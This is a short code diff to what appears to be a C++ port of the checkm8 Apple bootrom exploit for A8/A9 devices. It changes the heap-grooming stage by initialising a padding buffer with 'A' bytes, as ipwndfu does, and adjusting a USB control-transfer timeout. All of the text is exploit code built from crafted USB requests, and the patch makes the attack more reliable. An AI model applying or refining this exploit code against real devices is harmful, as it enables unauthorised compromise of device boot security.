@@ -723,7 +723,7 @@ void checkm8_A8_A9()
   printf("[*] stage 1, heap grooming ...\n");
 
   D.stall();
-  D.usb_req_leak();
+  D.leak();
   for (int i = 0; i < 40; i++)
   {
     D.no_leak();
@@ -737,8 +737,10 @@ void checkm8_A8_A9()
   A800.insert(A800.end(), 0x800, 'A');
   D.libusb1_async_ctrl_transfer(0x21, 1, 0, 0, A800, 0.0001);
   const int padding_sz = 0x400 + 0x80 + 0x80;
-  unsigned char padding[padding_sz];
-  D.libusb1_no_error_ctrl_transfer(0, 0, 0, 0, padding, padding_sz, 100);
+  // ipwndfu sends 'A' * padding here; the buffer must be initialised (it was
+  // previously an uninitialised stack array, sending garbage to the device).
+  std::vector<uint8_t> padding(padding_sz, 'A');
+  D.libusb1_no_error_ctrl_transfer(0, 0, 0, 0, padding.data(), padding_sz, 10);
   D.libusb1_no_error_ctrl_transfer(0x21, 4, 0, 0, 0, 0, 0);
   D.release_device();
 
